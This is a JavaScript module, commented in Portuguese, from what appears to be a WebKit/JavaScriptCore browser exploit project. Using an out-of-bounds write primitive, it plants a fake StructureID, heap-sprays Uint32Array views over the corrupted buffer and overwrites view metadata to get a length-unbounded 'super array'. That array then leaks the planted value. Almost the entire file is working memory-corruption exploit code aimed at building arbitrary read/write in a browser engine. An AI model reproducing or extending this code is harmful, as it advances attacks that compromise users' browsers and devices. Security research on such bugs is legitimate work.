// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v10.37";

const CORRUPTION_OFFSET_TRIGGER_0x70 = 0x70;
const CORRUPTION_VALUE_0x70 = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

// Área no oob_array_buffer_real onde os metadados de uma view serão corrompidos
const TARGET_METADATA_AREA_IN_OOB = 0x58; 
const TARGET_MVECTOR_OFFSET_IN_OOB = TARGET_METADATA_AREA_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x68
const TARGET_MLENGTH_OFFSET_IN_OOB = TARGET_METADATA_AREA_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // 0x70

const DESIRED_MVECTOR_VALUE  = AdvancedInt64.Zero;
const DESIRED_MLENGTH_VALUE  = 0xFFFFFFFF;

// Offset no oob_array_buffer_real onde plantaremos um JSCell FALSO para ler seu SID
const FAKE_U32_ARRAY_JSCELL_OFFSET_IN_OOB = 0x400;
const FAKE_U32_ARRAY_SID_TO_PLANT = 0xABCDEF01; // Um valor distinto

let DISCOVERED_UINT32ARRAY_SID = null; // Para armazenar o SID se conseguirmos vazá-lo


// ============================================================
// FUNÇÃO PRINCIPAL (v10.37 - Vazar SID Plantado com SuperArray)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.leakPlantedSIDWithSuperArray_v10.37`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Vazar SID Plantado com SuperArray ---`, "test", FNAME_CURRENT_TEST);

    const NUM_SPRAY_VIEWS = 200;
    const SPRAY_VIEW_ELEMENT_COUNT = 8;

    let sprayedVictimViews = [];
    let superArray = null;
    let superArrayIndex = -1;

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        // 1. Plantar um JSCell FALSO (apenas o SID) em um local conhecido do oob_array_buffer_real
        logS3(`PASSO 1: Plantando SID FALSO ${toHex(FAKE_U32_ARRAY_SID_TO_PLANT)} em ${toHex(FAKE_U32_ARRAY_JSCELL_OFFSET_IN_OOB)}...`, "info", FNAME_CURRENT_TEST);
        oob_write_absolute(FAKE_U32_ARRAY_JSCELL_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET, FAKE_U32_ARRAY_SID_TO_PLANT, 4);
        // Opcional: Preencher outros campos do JSCell falso se necessário para estabilidade da leitura
        oob_write_absolute(FAKE_U32_ARRAY_JSCELL_OFFSET_IN_OOB + JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, AdvancedInt64.Zero, 8); // Structure* nulo

        // 2. Heap Spraying: Criar VIEWS sobre o oob_array_buffer_real
        logS3(`PASSO 2: Pulverizando ${NUM_SPRAY_VIEWS} Uint32Array views sobre oob_array_buffer_real...`, "info", FNAME_CURRENT_TEST);
        let current_data_offset_for_view = (OOB_CONFIG.BASE_OFFSET_IN_DV || 0) + 0x800;
        for (let i = 0; i < NUM_SPRAY_VIEWS; i++) {
            const view_byte_length = SPRAY_VIEW_ELEMENT_COUNT * 4;
            if (current_data_offset_for_view + view_byte_length > oob_array_buffer_real.byteLength) break;
            try {
                let view = new Uint32Array(oob_array_buffer_real, current_data_offset_for_view, SPRAY_VIEW_ELEMENT_COUNT);
                view[0] = (0xFACE0000 | i);
                sprayedVictimViews.push(view);
                current_data_offset_for_view += view_byte_length + 0x80;
            } catch (e_spray) { break; }
        }
        logS3(`  ${sprayedVictimViews.length} views pulverizadas.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(300);

        // 3. Corromper bytes em TARGET_METADATA_AREA_IN_OOB (0x58) para m_vector=0, m_length=MAX
        logS3(`PASSO 3: Corrompendo bytes em ${toHex(TARGET_MVECTOR_OFFSET_IN_OOB)} e ${toHex(TARGET_MLENGTH_OFFSET_IN_OOB)}...`, "info", FNAME_CURRENT_TEST);
        oob_write_absolute(TARGET_MVECTOR_OFFSET_IN_OOB, DESIRED_MVECTOR_VALUE, 8);
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER_0x70, CORRUPTION_VALUE_0x70, 8); // Define m_length e m_mode em 0x58
        await PAUSE_S3(100);

        const val_mvec = oob_read_absolute(TARGET_MVECTOR_OFFSET_IN_OOB, 8);
        const val_mlen = oob_read_absolute(TARGET_MLENGTH_OFFSET_IN_OOB, 4);
        logS3(`  Bytes em ${toHex(TARGET_METADATA_AREA_IN_OOB)}: mvec=${val_mvec.toString(true)}, mlen=${toHex(val_mlen)}`, "info", FNAME_CURRENT_TEST);

        if (!(val_mvec.isZero() && val_mlen === DESIRED_MLENGTH_VALUE)) {
            logS3("    AVISO: Os bytes em 0x58 não foram corrompidos como esperado para m_vector=0, m_length=MAX.", "warn", FNAME_CURRENT_TEST);
        } else {
            logS3("    Bytes em 0x58 preparados com m_vector=0, m_length=MAX.", "good", FNAME_CURRENT_TEST);
        }

        // 4. Tentar Identificar o "Super Array" (View)
        logS3(`PASSO 4: Tentando identificar uma "Super View"...`, "info", FNAME_CURRENT_TEST);
        const MARKER_VALUE = 0xBEEFBEEF;
        const MARKER_TEST_OFFSET = 0xE0; 
        const MARKER_TEST_INDEX = MARKER_TEST_OFFSET / 4;

        let original_value_at_marker = 0;
        try { original_value_at_marker = oob_read_absolute(MARKER_TEST_OFFSET, 4); } catch(e){}
        oob_write_absolute(MARKER_TEST_OFFSET, MARKER_VALUE, 4);

        for (let i = 0; i < sprayedVictimViews.length; i++) {
            try {
                if (sprayedVictimViews[i][MARKER_TEST_INDEX] === MARKER_VALUE) {
                    logS3(`    !!!! SUPER ARRAY (VIEW) POTENCIALMENTE ENCONTRADO !!!! sprayedVictimViews[${i}] (marcador dados: ${toHex(sprayedVictimViews[i][0])})`, "vuln", FNAME_CURRENT_TEST);
                    superArray = sprayedVictimViews[i];
                    superArrayIndex = i;
                    document.title = `SUPER VIEW[${i}] ATIVA!`;
                    break; 
                }
            } catch (e_access) { /* Ignora */ }
        }
        try {oob_write_absolute(MARKER_TEST_OFFSET, original_value_at_marker, 4); } catch(e){}

        if (superArray) {
            logS3(`    SUPER ARRAY JS: sprayedVictimViews[${superArrayIndex}] identificado!`, "good", FNAME_CURRENT_TEST);
            logS3(`      superArray.length (JS): ${superArray.length}. Tentando ler SID plantado...`, "info", FNAME_CURRENT_TEST);

            // Usar o superArray para ler o SID que plantamos em FAKE_U32_ARRAY_JSCELL_OFFSET_IN_OOB
            const sid_read_target_addr = FAKE_U32_ARRAY_JSCELL_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET;
            if (sid_read_target_addr % 4 === 0) {
                const sid_index_in_superarray = sid_read_target_addr / 4;
                if (superArray.length > sid_index_in_superarray) {
                    const sid_leaked_via_superarray = superArray[sid_index_in_superarray];
                    logS3(`      LIDO COM SUPERARRAY de oob[${toHex(sid_read_target_addr)}]: ${toHex(sid_leaked_via_superarray)}`, "leak", FNAME_CURRENT_TEST);
                    if (sid_leaked_via_superarray === FAKE_U32_ARRAY_SID_TO_PLANT) {
                        logS3(`        !!!! SUCESSO !!!! O SID plantado (${toHex(FAKE_U32_ARRAY_SID_TO_PLANT)}) foi lido corretamente com o SuperArray!`, "vuln", FNAME_CURRENT_TEST);
                        DISCOVERED_UINT32ARRAY_SID = sid_leaked_via_superarray; // Ou o SID real que você quer descobrir
                        logS3(`        Considerando ${toHex(DISCOVERED_UINT32ARRAY_SID)} como um StructureID REAL para Uint32Array! (Verifique!)`, "vuln", FNAME_CURRENT_TEST);
                        document.title = `SID ${toHex(DISCOVERED_UINT32ARRAY_SID)} Vazado!`;
                    } else {
                        logS3(`        AVISO: SID lido (${toHex(sid_leaked_via_superarray)}) não corresponde ao plantado (${toHex(FAKE_U32_ARRAY_SID_TO_PLANT)}).`, "warn", FNAME_CURRENT_TEST);
                    }
                } else {
                    logS3(`      AVISO: Índice ${toHex(sid_index_in_superarray)} fora do superArray.length aparente (${superArray.length})`, "warn", FNAME_CURRENT_TEST);
                }
            } else {
                logS3(`      AVISO: Endereço de leitura de SID ${toHex(sid_read_target_addr)} não alinhado para acesso Uint32.`, "warn", FNAME_CURRENT_TEST);
            }
        } else {
            logS3("    Não foi possível identificar a 'superArray' (View) específica via teste de marcador.", "warn", FNAME_CURRENT_TEST);
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO: ${e.message}`, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU!`;
    } finally {
        sprayedVictimViews = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
}
